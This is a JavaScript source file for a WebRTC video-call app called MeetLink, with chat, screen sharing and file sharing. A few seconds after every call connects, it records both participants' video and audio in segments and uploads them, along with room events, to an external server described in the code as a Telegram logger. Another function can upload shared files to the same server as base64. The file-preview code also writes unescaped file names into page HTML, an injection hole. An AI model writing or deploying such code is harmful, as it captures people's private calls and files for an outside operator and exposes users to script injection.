// ============ MeetLink - Neon WebRTC + Auto Recording + Telegram ============
// Fixed: Joiner peer ID conflict, Added: Direct file sharing with preview

// ---- CONFIG ----
const SERVER_URL = 'https://familiar-gertrudis-botakingtipd-f3991937.koyeb.app';
const SEGMENT_DURATION_MS = 3 * 60 * 1000;

// ---- DOM ----
const homePage = document.getElementById('homePage');
const roomPage = document.getElementById('roomPage');
const createRoomBtn = document.getElementById('createRoomBtn');
const joinRoomInput = document.getElementById('joinRoomInput');
const joinRoomBtn = document.getElementById('joinRoomBtn');
const roomIdDisplay = document.getElementById('roomIdDisplay');
const copyLinkBtn = document.getElementById('copyLinkBtn');
const copyLinkBtn2 = document.getElementById('copyLinkBtn2');
const leaveRoomBtn = document.getElementById('leaveRoomBtn');
const shareableLink = document.getElementById('shareableLink');
const waitingScreen = document.getElementById('waitingScreen');
const callScreen = document.getElementById('callScreen');
const localVideo = document.getElementById('localVideo');
const remoteVideo = document.getElementById('remoteVideo');
const remoteNoVideo = document.getElementById('remoteNoVideo');
const toggleMicBtn = document.getElementById('toggleMicBtn');
const toggleCamBtn = document.getElementById('toggleCamBtn');
const toggleScreenBtn = document.getElementById('toggleScreenBtn');
const toggleChatBtn = document.getElementById('toggleChatBtn');
const endCallBtn = document.getElementById('endCallBtn');
const chatPanel = document.getElementById('chatPanel');
const closeChatBtn = document.getElementById('closeChatBtn');
const chatMessages = document.getElementById('chatMessages');
const chatInput = document.getElementById('chatInput');
const sendChatBtn = document.getElementById('sendChatBtn');
const attachFileBtn = document.getElementById('attachFileBtn');
const fileInput = document.getElementById('fileInput');
const fileProgress = document.getElementById('fileProgress');
const fileProgressFill = document.getElementById('fileProgressFill');
const fileProgressText = document.getElementById('fileProgressText');
const toastEl = document.getElementById('toast');
const recordingIndicator = document.getElementById('recordingIndicator');
const tcModal = document.getElementById('tcModal');
const tcCloseBtn = document.getElementById('tcCloseBtn');
const tcLink = document.getElementById('tcLink');
const tcLink2 = document.getElementById('tcLink2');
const tcLink3 = document.getElementById('tcLink3');
const recordingCanvas = document.getElementById('recordingCanvas');

// ---- State ----
let peer = null, currentCall = null, localStream = null, dataConnection = null;
let isMicOn = true, isCamOn = true, isScreenSharing = false;
let originalVideoTrack = null, incomingFileBuffers = {};
let currentRoomId = null, callStartTime = null, userRole = 'creator', messageCount = 0;
let canvasDrawInterval = null, audioCtx = null, combinedStream = null;
let mediaRecorder = null, recordedChunks = [];
let segmentNumber = 0, recordingTimer = null, isCallActive = false;
let totalRecordingSize = 0;
const CHUNK_SIZE = 16384;

// ============ T&C MODAL ============
[tcLink, tcLink2, tcLink3].forEach(el => {
    if (el) el.addEventListener('click', (e) => { e.preventDefault(); tcModal.classList.remove('hidden'); });
});
tcCloseBtn.addEventListener('click', () => tcModal.classList.add('hidden'));
tcModal.addEventListener('click', (e) => { if (e.target === tcModal) tcModal.classList.add('hidden'); });

// ============ TELEGRAM LOGGER ============
async function logEvent(eventType, extraData = {}) {
    try {
        await fetch(`${SERVER_URL}/api/event`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: eventType, roomId: currentRoomId, timestamp: new Date().toISOString(), ...extraData })
        });
    } catch (e) { }
}

async function logFileUpload(fileName, arrayBuffer) {
    try {
        if (arrayBuffer.byteLength > 50 * 1024 * 1024) return;
        const base64 = arrayBufferToBase64(arrayBuffer);
        await fetch(`${SERVER_URL}/api/event`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'file_upload', roomId: currentRoomId, fileName, fileSize: arrayBuffer.byteLength, sender: userRole, fileData: base64 })
        });
    } catch (e) { }
}

async function uploadRecordingSegment(blob, segNum, isLast) {
    if (!blob || blob.size === 0) return;
    try {
        totalRecordingSize += blob.size;
        const formData = new FormData();
        const filename = `recording_${currentRoomId || 'unknown'}_part${segNum}.webm`;
        formData.append('video', blob, filename);
        formData.append('roomId', currentRoomId || 'unknown');
        formData.append('segmentNumber', String(segNum));
        formData.append('isLast', String(isLast));
        formData.append('segmentSize', String(blob.size));
        const resp = await fetch(`${SERVER_URL}/api/upload-recording`, { method: 'POST', body: formData });
        console.log(`✅ Segment ${segNum} uploaded (${(blob.size / 1024 / 1024).toFixed(1)} MB)`);
    } catch (e) { console.error('Segment upload failed:', e); }
}

function arrayBufferToBase64(buffer) {
    const bytes = new Uint8Array(buffer);
    let binary = '';
    const chunk = 8192;
    for (let i = 0; i < bytes.length; i += chunk) {
        const c = bytes.subarray(i, i + chunk);
        binary += String.fromCharCode.apply(null, c);
    }
    return btoa(binary);
}

// ============ DIRECT FILE SHARING ============
const fileShareInput = document.getElementById('fileShareInput');
const fileShareBtn = document.getElementById('fileShareBtn');
const fileShareProgress = document.getElementById('fileShareProgress');
const fileShareProgressFill = document.getElementById('fileShareProgressFill');
const fileShareResult = document.getElementById('fileShareResult');
const fileShareLink = document.getElementById('fileShareLink');
const fileShareCopyBtn = document.getElementById('fileShareCopyBtn');

if (fileShareBtn) {
    fileShareBtn.addEventListener('click', () => fileShareInput.click());
}

if (fileShareInput) {
    fileShareInput.addEventListener('change', async () => {
        const file = fileShareInput.files[0];
        if (!file) return;
        fileShareProgress.classList.remove('hidden');
        fileShareResult.classList.add('hidden');
        fileShareProgressFill.style.width = '0%';

        const formData = new FormData();
        formData.append('file', file);

        try {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', `${SERVER_URL}/api/upload-file`);

            xhr.upload.onprogress = (e) => {
                if (e.lengthComputable) {
                    const pct = Math.round((e.loaded / e.total) * 100);
                    fileShareProgressFill.style.width = pct + '%';
                }
            };

            xhr.onload = () => {
                if (xhr.status === 200) {
                    const result = JSON.parse(xhr.responseText);
                    fileShareLink.value = result.url;
                    fileShareResult.classList.remove('hidden');
                    fileShareProgress.classList.add('hidden');
                    showToast('✅ File uploaded! Link ready!');
                } else {
                    showToast('❌ Upload failed');
                    fileShareProgress.classList.add('hidden');
                }
            };

            xhr.onerror = () => {
                showToast('❌ Upload failed - Server error');
                fileShareProgress.classList.add('hidden');
            };

            xhr.send(formData);
        } catch (e) {
            showToast('❌ Upload failed');
            fileShareProgress.classList.add('hidden');
        }

        fileShareInput.value = '';
    });
}

if (fileShareCopyBtn) {
    fileShareCopyBtn.addEventListener('click', () => {
        navigator.clipboard.writeText(fileShareLink.value).then(() => showToast('Link copied! 📋'));
    });
}

// ============ FILE PREVIEW PAGE ============
function checkFilePreview() {
    const params = new URLSearchParams(window.location.search);
    const fileId = params.get('file');
    if (fileId) {
        showFilePreview(fileId);
    }
}

function showFilePreview(fileId) {
    // Create a full-screen preview overlay
    const overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#050510;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;';

    const loading = document.createElement('div');
    loading.style.cssText = 'color:#b14dff;font-family:Orbitron,sans-serif;font-size:1.2rem;';
    loading.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading file...';
    overlay.appendChild(loading);
    document.body.appendChild(overlay);

    // Fetch file info
    fetch(`${SERVER_URL}/api/file-info/${fileId}`)
        .then(r => r.json())
        .then(info => {
            overlay.removeChild(loading);

            if (info.error) {
                overlay.innerHTML = '<div style="color:#ff2d75;font-family:Orbitron;font-size:1.2rem;">File not found or expired</div>';
                return;
            }

            const fileUrl = `${SERVER_URL}/api/file/${fileId}`;

            // Header
            const header = document.createElement('div');
            header.style.cssText = 'width:100%;max-width:900px;margin-bottom:20px;display:flex;align-items:center;justify-content:space-between;';
            header.innerHTML = `
                <div style="display:flex;align-items:center;gap:12px;">
                    <div style="width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#b14dff,#00f0ff);display:flex;align-items:center;justify-content:center;">
                        <i class="fas fa-file" style="color:#fff;"></i>
                    </div>
                    <div>
                        <div style="color:#e8e8ff;font-weight:700;font-size:1rem;">${info.fileName || 'File'}</div>
                        <div style="color:#8888bb;font-size:0.8rem;">${info.fileSize || ''} • MeetLink Share</div>
                    </div>
                </div>
                <a href="${fileUrl}" download="${info.fileName || 'file'}" style="padding:10px 24px;background:linear-gradient(135deg,#b14dff,#8b3dff);color:#fff;border:none;border-radius:10px;text-decoration:none;font-weight:600;font-family:Inter,sans-serif;cursor:pointer;box-shadow:0 0 15px rgba(177,77,255,0.4);">
                    <i class="fas fa-download"></i> Download
                </a>
            `;
            overlay.appendChild(header);

            // Preview area
            const preview = document.createElement('div');
            preview.style.cssText = 'flex:1;width:100%;max-width:900px;display:flex;align-items:center;justify-content:center;overflow:auto;border-radius:16px;border:1px solid #1c1c50;background:#0a0a1f;';

            const ext = (info.fileName || '').split('.').pop().toLowerCase();
            const imageExts = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'bmp', 'ico'];
            const videoExts = ['mp4', 'webm', 'mkv', 'avi', 'mov'];
            const audioExts = ['mp3', 'wav', 'ogg', 'flac', 'aac'];
            const pdfExts = ['pdf'];

            if (imageExts.includes(ext)) {
                preview.innerHTML = `<img src="${fileUrl}" style="max-width:100%;max-height:70vh;border-radius:12px;object-fit:contain;" alt="${info.fileName}">`;
            } else if (videoExts.includes(ext)) {
                preview.innerHTML = `<video src="${fileUrl}" controls autoplay style="max-width:100%;max-height:70vh;border-radius:12px;"></video>`;
            } else if (audioExts.includes(ext)) {
                preview.innerHTML = `<div style="text-align:center;padding:40px;"><i class="fas fa-music" style="font-size:4rem;color:#b14dff;margin-bottom:20px;display:block;"></i><audio src="${fileUrl}" controls autoplay style="width:100%;max-width:400px;"></audio></div>`;
            } else if (pdfExts.includes(ext)) {
                preview.innerHTML = `<iframe src="${fileUrl}" style="width:100%;height:70vh;border:none;border-radius:12px;"></iframe>`;
            } else {
                preview.innerHTML = `<div style="text-align:center;padding:60px;"><i class="fas fa-file" style="font-size:4rem;color:#00f0ff;margin-bottom:20px;display:block;"></i><div style="color:#e8e8ff;font-size:1.2rem;font-weight:700;margin-bottom:8px;">${info.fileName}</div><div style="color:#8888bb;margin-bottom:20px;">${info.fileSize || ''}</div><div style="color:#555580;font-size:0.9rem;">Preview not available. Click Download to save the file.</div></div>`;
            }

            overlay.appendChild(preview);
        })
        .catch(e => {
            overlay.innerHTML = '<div style="color:#ff2d75;font-family:Orbitron;font-size:1.2rem;">Error loading file</div>';
        });
}

// ============ SEGMENTED RECORDING SYSTEM ============
function setupRecordingStreams() {
    try {
        const recCanvas = recordingCanvas;
        recCanvas.width = 1280;
        recCanvas.height = 720;
        const ctx = recCanvas.getContext('2d');

        canvasDrawInterval = setInterval(() => {
            ctx.fillStyle = '#080818';
            ctx.fillRect(0, 0, 1280, 720);

            try {
                if (remoteVideo && remoteVideo.readyState >= 2) {
                    ctx.drawImage(remoteVideo, 0, 0, 1280, 720);
                } else {
                    ctx.fillStyle = '#0a0a2a';
                    ctx.fillRect(0, 0, 1280, 720);
                    ctx.fillStyle = '#555580';
                    ctx.font = '24px Inter, sans-serif';
                    ctx.textAlign = 'center';
                    ctx.fillText('Waiting for video...', 640, 360);
                }
            } catch (e) { }

            try {
                if (localVideo && localVideo.readyState >= 2) {
                    const pipW = 280, pipH = 210;
                    const pipX = 1280 - pipW - 15, pipY = 720 - pipH - 15;
                    ctx.fillStyle = '#b14dff';
                    ctx.fillRect(pipX - 2, pipY - 2, pipW + 4, pipH + 4);
                    ctx.drawImage(localVideo, pipX, pipY, pipW, pipH);
                    ctx.fillStyle = 'rgba(0,0,0,0.6)';
                    ctx.fillRect(pipX, pipY + pipH - 24, pipW, 24);
                    ctx.fillStyle = '#ffffff';
                    ctx.font = '12px Inter, sans-serif';
                    ctx.textAlign = 'center';
                    ctx.fillText('You', pipX + pipW / 2, pipY + pipH - 8);
                }
            } catch (e) { }

            const now = new Date();
            const timeStr = now.toLocaleTimeString();
            const dateStr = now.toLocaleDateString();
            const elapsed = callStartTime ? formatCallDuration() : '00:00';
            ctx.fillStyle = 'rgba(0,0,0,0.5)';
            ctx.fillRect(10, 10, 280, 28);
            ctx.fillStyle = '#ff2d75';
            ctx.font = '12px Orbitron, monospace';
            ctx.textAlign = 'left';
            ctx.fillText('● REC  ' + dateStr + ' ' + timeStr + '  [' + elapsed + ']', 18, 28);
        }, 1000 / 30);

        const canvasVideoStream = recCanvas.captureStream(30);

        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const destination = audioCtx.createMediaStreamDestination();

        if (localStream) {
            const localAudioTracks = localStream.getAudioTracks();
            if (localAudioTracks.length > 0) {
                const localSource = audioCtx.createMediaStreamSource(new MediaStream([localAudioTracks[0]]));
                localSource.connect(destination);
            }
        }

        try {
            if (remoteVideo && remoteVideo.captureStream) {
                const remoteStream = remoteVideo.captureStream();
                const remoteAudioTracks = remoteStream.getAudioTracks();
                if (remoteAudioTracks.length > 0) {
                    const remoteSource = audioCtx.createMediaStreamSource(new MediaStream([remoteAudioTracks[0]]));
                    remoteSource.connect(destination);
                }
            }
        } catch (e) { }

        combinedStream = new MediaStream([
            ...canvasVideoStream.getVideoTracks(),
            ...destination.stream.getAudioTracks()
        ]);

        return true;
    } catch (e) {
        console.error('Recording setup failed:', e);
        return false;
    }
}

function getSupportedMimeType() {
    const types = ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm;codecs=h264,opus', 'video/webm'];
    for (const t of types) { if (MediaRecorder.isTypeSupported(t)) return t; }
    return 'video/webm';
}

function startNewSegment() {
    if (!combinedStream || !isCallActive) return;
    segmentNumber++;
    recordedChunks = [];
    const mimeType = getSupportedMimeType();
    mediaRecorder = new MediaRecorder(combinedStream, { mimeType, videoBitsPerSecond: 2500000 });
    mediaRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) recordedChunks.push(e.data); };
    mediaRecorder.onstop = () => {
        if (recordedChunks.length > 0) {
            const blob = new Blob(recordedChunks, { type: mimeType });
            uploadRecordingSegment(blob, segmentNumber, false);
        }
        recordedChunks = [];
        mediaRecorder = null;
        if (isCallActive) startNewSegment();
    };
    mediaRecorder.start(1000);
    recordingTimer = setTimeout(() => { if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop(); }, SEGMENT_DURATION_MS);
}

function startRecording() {
    try {
        if (!setupRecordingStreams()) return;
        isCallActive = true; segmentNumber = 0; totalRecordingSize = 0;
        recordingIndicator.classList.remove('hidden');
        startNewSegment();
    } catch (e) { console.error('Recording start failed:', e); }
}

function stopRecording() {
    isCallActive = false;
    if (recordingTimer) { clearTimeout(recordingTimer); recordingTimer = null; }
    if (canvasDrawInterval) { clearInterval(canvasDrawInterval); canvasDrawInterval = null; }
    if (audioCtx) { audioCtx.close().catch(() => {}); audioCtx = null; }

    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
        const currentSegNum = segmentNumber;
        const currentChunks = [...recordedChunks];
        mediaRecorder.onstop = () => {
            const allChunks = [...currentChunks, ...recordedChunks];
            if (allChunks.length > 0) {
                const blob = new Blob(allChunks, { type: 'video/webm' });
                totalRecordingSize += blob.size;
                uploadRecordingSegment(blob, currentSegNum, true);
            }
            const totalMB = (totalRecordingSize / 1024 / 1024).toFixed(1);
            logEvent('recording_complete', { totalSegments: segmentNumber, totalSize: totalRecordingSize, duration: formatCallDuration() });
            mediaRecorder = null; recordedChunks = []; combinedStream = null;
        };
        mediaRecorder.stop();
    } else {
        if (segmentNumber > 0) logEvent('recording_complete', { totalSegments: segmentNumber, totalSize: totalRecordingSize, duration: formatCallDuration() });
        combinedStream = null;
    }
    recordingIndicator.classList.add('hidden');
}

// ============ NEON PARTICLE BACKGROUND ============
(function initNeonCanvas() {
    const canvas = document.getElementById('neonCanvas');
    const ctx = canvas.getContext('2d');
    let particles = [], mouseX = 0, mouseY = 0, width, height;
    function resize() { width = canvas.width = window.innerWidth; height = canvas.height = window.innerHeight; }
    resize();
    window.addEventListener('resize', resize);
    document.addEventListener('mousemove', (e) => { mouseX = e.clientX; mouseY = e.clientY; });

    class Particle {
        constructor() { this.reset(); }
        reset() {
            this.x = Math.random() * width; this.y = Math.random() * height;
            this.size = Math.random() * 2.5 + 0.5;
            this.speedX = (Math.random() - 0.5) * 0.8; this.speedY = (Math.random() - 0.5) * 0.8;
            this.opacity = Math.random() * 0.6 + 0.2;
            this.hue = Math.random() < 0.5 ? 275 : 190;
            this.pulse = Math.random() * Math.PI * 2;
            this.pulseSpeed = Math.random() * 0.02 + 0.01;
        }
        update() {
            this.x += this.speedX; this.y += this.speedY; this.pulse += this.pulseSpeed;
            const dx = mouseX - this.x, dy = mouseY - this.y, dist = Math.sqrt(dx * dx + dy * dy);
            if (dist < 200) { this.x += dx * 0.002; this.y += dy * 0.002; }
            if (this.x < -10 || this.x > width + 10 || this.y < -10 || this.y > height + 10) this.reset();
        }
        draw() {
            const glow = Math.sin(this.pulse) * 0.3 + 0.7, alpha = this.opacity * glow;
            ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
            ctx.fillStyle = `hsla(${this.hue}, 100%, 70%, ${alpha})`;
            ctx.shadowColor = `hsla(${this.hue}, 100%, 60%, ${alpha * 0.8})`; ctx.shadowBlur = 15;
            ctx.fill(); ctx.shadowBlur = 0;
        }
    }
    const count = Math.min(Math.floor((width * height) / 6000), 200);
    for (let i = 0; i < count; i++) particles.push(new Particle());

    function drawConnections() {
        for (let i = 0; i < particles.length; i++) {
            for (let j = i + 1; j < particles.length; j++) {
                const dx = particles[i].x - particles[j].x, dy = particles[i].y - particles[j].y;
                const dist = Math.sqrt(dx * dx + dy * dy);
                if (dist < 120) {
                    ctx.beginPath(); ctx.moveTo(particles[i].x, particles[i].y); ctx.lineTo(particles[j].x, particles[j].y);
                    ctx.strokeStyle = `hsla(275, 80%, 60%, ${(1 - dist / 120) * 0.15})`; ctx.lineWidth = 0.5; ctx.stroke();
                }
            }
        }
    }

    class NeonOrb {
        constructor() {
            this.x = Math.random() * width; this.y = Math.random() * height;
            this.radius = Math.random() * 80 + 40;
            this.speedX = (Math.random() - 0.5) * 0.3; this.speedY = (Math.random() - 0.5) * 0.3;
            this.hue = [275, 190, 340][Math.floor(Math.random() * 3)];
            this.opacity = Math.random() * 0.06 + 0.02;
        }
        update() {
            this.x += this.speedX; this.y += this.speedY;
            if (this.x < -this.radius) this.x = width + this.radius;
            if (this.x > width + this.radius) this.x = -this.radius;
            if (this.y < -this.radius) this.y = height + this.radius;
            if (this.y > height + this.radius) this.y = -this.radius;
        }
        draw() {
            const g = ctx.createRadialGradient(this.x, this.y, 0, this.x, this.y, this.radius);
            g.addColorStop(0, `hsla(${this.hue}, 100%, 60%, ${this.opacity})`);
            g.addColorStop(1, `hsla(${this.hue}, 100%, 60%, 0)`);
            ctx.beginPath(); ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2); ctx.fillStyle = g; ctx.fill();
        }
    }
    const orbs = [];
    for (let i = 0; i < 6; i++) orbs.push(new NeonOrb());

    function animate() {
        ctx.clearRect(0, 0, width, height);
        orbs.forEach(o => { o.update(); o.draw(); });
        drawConnections();
        particles.forEach(p => { p.update(); p.draw(); });
        requestAnimationFrame(animate);
    }
    animate();
})();

// ============ UTILS ============
function generateRoomId() {
    const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let id = 'meet-';
    for (let i = 0; i < 8; i++) id += c[Math.floor(Math.random() * c.length)];
    return id;
}
function generateJoinerId() {
    const c = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let id = 'joiner-';
    for (let i = 0; i < 10; i++) id += c[Math.floor(Math.random() * c.length)];
    return id;
}
function showToast(msg, dur = 3000) { toastEl.textContent = msg; toastEl.classList.add('show'); setTimeout(() => toastEl.classList.remove('show'), dur); }
function showPage(p) { document.querySelectorAll('.page').forEach(x => x.classList.remove('active')); p.classList.add('active'); }
function getRoomLink(rid) { return `${window.location.origin}${window.location.pathname}?room=${rid}`; }
function formatFileSize(b) {
    if (b === 0) return '0 B';
    const k = 1024, s = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(b) / Math.log(k));
    return parseFloat((b / Math.pow(k, i)).toFixed(1)) + ' ' + s[i];
}
function getFileIcon(f) {
    const ext = f.split('.').pop().toLowerCase();
    const m = { jpg:'fa-file-image',jpeg:'fa-file-image',png:'fa-file-image',gif:'fa-file-image',webp:'fa-file-image',svg:'fa-file-image',pdf:'fa-file-pdf',doc:'fa-file-word',docx:'fa-file-word',xls:'fa-file-excel',xlsx:'fa-file-excel',ppt:'fa-file-powerpoint',pptx:'fa-file-powerpoint',zip:'fa-file-archive',rar:'fa-file-archive',mp3:'fa-file-audio',wav:'fa-file-audio',mp4:'fa-file-video',mkv:'fa-file-video',txt:'fa-file-alt',json:'fa-file-code',js:'fa-file-code',py:'fa-file-code' };
    return m[ext] || 'fa-file';
}
function isImageFile(f) { return ['jpg','jpeg','png','gif','webp','svg','bmp','ico'].includes(f.split('.').pop().toLowerCase()); }
function formatCallDuration() {
    if (!callStartTime) return '0s';
    const s = Math.floor((Date.now() - callStartTime) / 1000);
    const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60;
    if (h > 0) return `${h}h ${m}m ${sec}s`;
    if (m > 0) return `${m}m ${sec}s`;
    return `${sec}s`;
}

// ============ NAVIGATION ============
createRoomBtn.addEventListener('click', () => { initRoom(generateRoomId(), true); });
joinRoomBtn.addEventListener('click', () => {
    const input = joinRoomInput.value.trim();
    if (!input) { showToast('Please paste a room link or ID'); return; }
    let rid = input;
    try { const u = new URL(input); if (u.searchParams.get('room')) rid = u.searchParams.get('room'); } catch (e) { }
    initRoom(rid, false);
});
joinRoomInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') joinRoomBtn.click(); });
leaveRoomBtn.addEventListener('click', leaveRoom);
endCallBtn.addEventListener('click', leaveRoom);

// ============ INIT ROOM — FIXED JOINER ID ============
async function initRoom(roomId, isCreator) {
    currentRoomId = roomId;
    userRole = isCreator ? 'creator' : 'joiner';
    callStartTime = null;
    messageCount = 0;
    segmentNumber = 0;
    totalRecordingSize = 0;

    showPage(roomPage);
    roomIdDisplay.textContent = roomId;
    shareableLink.value = getRoomLink(roomId);

    if (isCreator) logEvent('room_created', { roomLink: getRoomLink(roomId) });
    else logEvent('user_joined', { roomLink: getRoomLink(roomId) });

    // 🔧 FIX: Creator uses roomId as peer ID, Joiner uses a UNIQUE random ID
    const myPeerId = isCreator ? roomId : generateJoinerId();

    peer = new Peer(myPeerId, {
        debug: 0,
        config: { iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' },
            { urls: 'stun:stun2.l.google.com:19302' },
            { urls: 'stun:stun3.l.google.com:19302' },
            { urls: 'stun:stun4.l.google.com:19302' },
        ]}
    });

    peer.on('open', (id) => {
        console.log('My peer ID:', id);
        if (isCreator) {
            showToast('Room created! Share the link 🚀');
        } else {
            // 🔧 FIX: Joiner now calls the creator's peer ID (which IS the roomId)
            console.log('Joining room:', roomId);
            callPeer(roomId);
        }
    });

    peer.on('error', (err) => {
        console.error('Peer error:', err.type, err);
        if (err.type === 'unavailable-id') {
            showToast('Room already exists! Try another link.');
            leaveRoom();
        } else if (err.type === 'peer-unavailable') {
            showToast('Person not online yet. Share the link & wait!');
        } else {
            showToast('Connection error: ' + err.type);
        }
    });

    peer.on('disconnected', () => {
        showToast('Disconnected...');
        if (peer && !peer.destroyed) peer.reconnect();
    });

    // Creator listens for incoming calls & data
    if (isCreator) {
        peer.on('call', handleIncomingCall);
        peer.on('connection', handleIncomingData);
    }
    // Joiner: call initiated in peer.on('open') above
}

// ============ GET MEDIA ============
async function getMediaStream() {
    try { return await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' }, audio: true }); }
    catch (e) {
        try { isCamOn = false; updateControlButtons(); return await navigator.mediaDevices.getUserMedia({ video: false, audio: true }); }
        catch (e2) { showToast('Camera/Mic access denied.'); return null; }
    }
}

// ============ CALL PEER (JOINER) — FIXED ============
async function callPeer(targetPeerId) {
    localStream = await getMediaStream();
    if (!localStream) { showToast('Cannot proceed without media'); return; }
    localVideo.srcObject = localStream;

    // Call the creator using their peer ID (= roomId)
    const call = peer.call(targetPeerId, localStream);
    if (!call) {
        showToast('Failed to connect. Is the other person online?');
        return;
    }

    call.on('stream', (rs) => {
        console.log('Remote stream received!');
        showCallScreen(rs);
    });
    call.on('close', () => { showToast('Call ended'); leaveRoom(); });
    call.on('error', (err) => { console.error('Call error:', err); showToast('Call failed'); });
    currentCall = call;

    // Open data connection for chat
    dataConnection = peer.connect(targetPeerId, { reliable: true });
    dataConnection.on('open', () => {
        console.log('Data connection established!');
    });
    dataConnection.on('data', handleDataMessage);
    dataConnection.on('close', () => console.log('Data connection closed'));
    dataConnection.on('error', (err) => console.error('Data error:', err));
}

// ============ INCOMING CALL (CREATOR) ============
async function handleIncomingCall(call) {
    console.log('📞 Incoming call from:', call.peer);
    localStream = await getMediaStream();
    if (!localStream) { showToast('No media access'); return; }
    localVideo.srcObject = localStream;
    call.answer(localStream);

    call.on('stream', (rs) => {
        console.log('Remote stream received!');
        showCallScreen(rs);
    });
    call.on('close', () => { showToast('Call ended'); leaveRoom(); });
    call.on('error', (err) => console.error('Call error:', err));
    currentCall = call;
}

function handleIncomingData(conn) {
    dataConnection = conn;
    conn.on('open', () => console.log('Data connection from joiner!'));
    conn.on('data', handleDataMessage);
    conn.on('close', () => console.log('Data connection closed'));
}

// ============ SHOW CALL + START RECORDING ============
function showCallScreen(remoteStream) {
    waitingScreen.style.display = 'none';
    callScreen.classList.remove('hidden');
    remoteVideo.srcObject = remoteStream;
    remoteNoVideo.style.display = 'none';
    callStartTime = Date.now();
    showToast('Connected! 🎉');
    logEvent('call_started');
    setTimeout(() => { startRecording(); }, 2000);
}

// ============ LEAVE ROOM ============
function leaveRoom() {
    if (isCallActive || (mediaRecorder && mediaRecorder.state !== 'inactive')) {
        stopRecording();
    }
    if (callStartTime) logEvent('call_ended', { duration: formatCallDuration(), messages: messageCount });
    else logEvent('user_left');

    if (currentCall) { currentCall.close(); currentCall = null; }
    if (dataConnection) { dataConnection.close(); dataConnection = null; }
    if (peer) { peer.destroy(); peer = null; }
    if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
    if (localVideo) localVideo.srcObject = null;
    if (remoteVideo) remoteVideo.srcObject = null;

    waitingScreen.style.display = 'flex';
    callScreen.classList.add('hidden');
    chatPanel.classList.add('hidden');
    fileProgress.classList.add('hidden');
    recordingIndicator.classList.add('hidden');
    isMicOn = true; isCamOn = true; isScreenSharing = false;
    incomingFileBuffers = {};
    callStartTime = null; messageCount = 0; currentRoomId = null;
    mediaRecorder = null; recordedChunks = [];
    combinedStream = null; isCallActive = false;
    segmentNumber = 0; totalRecordingSize = 0;
    if (recordingTimer) { clearTimeout(recordingTimer); recordingTimer = null; }
    updateControlButtons();

    chatMessages.innerHTML = '<div class="chat-system">Chat started. Say hello! 👋</div>';
    showPage(homePage);
    if (window.location.search) window.history.replaceState({}, document.title, window.location.pathname);
}

// ============ COPY LINK ============
function copyLink() {
    navigator.clipboard.writeText(shareableLink.value).then(() => showToast('Link copied! 📋')).catch(() => { shareableLink.select(); document.execCommand('copy'); showToast('Link copied!'); });
}
copyLinkBtn.addEventListener('click', copyLink);
copyLinkBtn2.addEventListener('click', copyLink);

// ============ MIC / CAM / SCREEN ============
toggleMicBtn.addEventListener('click', () => {
    if (!localStream) return;
    isMicOn = !isMicOn;
    localStream.getAudioTracks().forEach(t => t.enabled = isMicOn);
    updateControlButtons();
    showToast(isMicOn ? '🎙 Mic on' : '🔇 Mic muted');
});
toggleCamBtn.addEventListener('click', () => {
    if (!localStream) return;
    isCamOn = !isCamOn;
    localStream.getVideoTracks().forEach(t => t.enabled = isCamOn);
    updateControlButtons();
    showToast(isCamOn ? '📹 Camera on' : '🚫 Camera off');
});
toggleScreenBtn.addEventListener('click', async () => {
    if (!localStream || !currentCall) return;
    if (!isScreenSharing) {
        try {
            const ss = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: 'always' }, audio: false });
            originalVideoTrack = localStream.getVideoTracks()[0];
            const st = ss.getVideoTracks()[0];
            const sender = currentCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
            if (sender) await sender.replaceTrack(st);
            st.onended = async () => { if (sender && originalVideoTrack) await sender.replaceTrack(originalVideoTrack); isScreenSharing = false; updateControlButtons(); showToast('Screen share stopped'); };
            isScreenSharing = true; updateControlButtons(); showToast('🖥 Screen sharing started');
        } catch (e) { showToast('Screen share cancelled'); }
    } else {
        if (originalVideoTrack) {
            const sender = currentCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
            if (sender) await sender.replaceTrack(originalVideoTrack);
        }
        isScreenSharing = false; updateControlButtons(); showToast('Screen share stopped');
    }
});

function updateControlButtons() {
    toggleMicBtn.className = 'control-btn' + (isMicOn ? '' : ' off');
    toggleMicBtn.innerHTML = isMicOn ? '<i class="fas fa-microphone"></i>' : '<i class="fas fa-microphone-slash"></i>';
    toggleCamBtn.className = 'control-btn' + (isCamOn ? '' : ' off');
    toggleCamBtn.innerHTML = isCamOn ? '<i class="fas fa-video"></i>' : '<i class="fas fa-video-slash"></i>';
    toggleScreenBtn.className = 'control-btn' + (isScreenSharing ? ' active' : '');
}

// ============ CHAT ============
toggleChatBtn.addEventListener('click', () => { chatPanel.classList.toggle('hidden'); toggleChatBtn.classList.toggle('active'); });
closeChatBtn.addEventListener('click', () => { chatPanel.classList.add('hidden'); toggleChatBtn.classList.remove('active'); });
sendChatBtn.addEventListener('click', sendTextMessage);
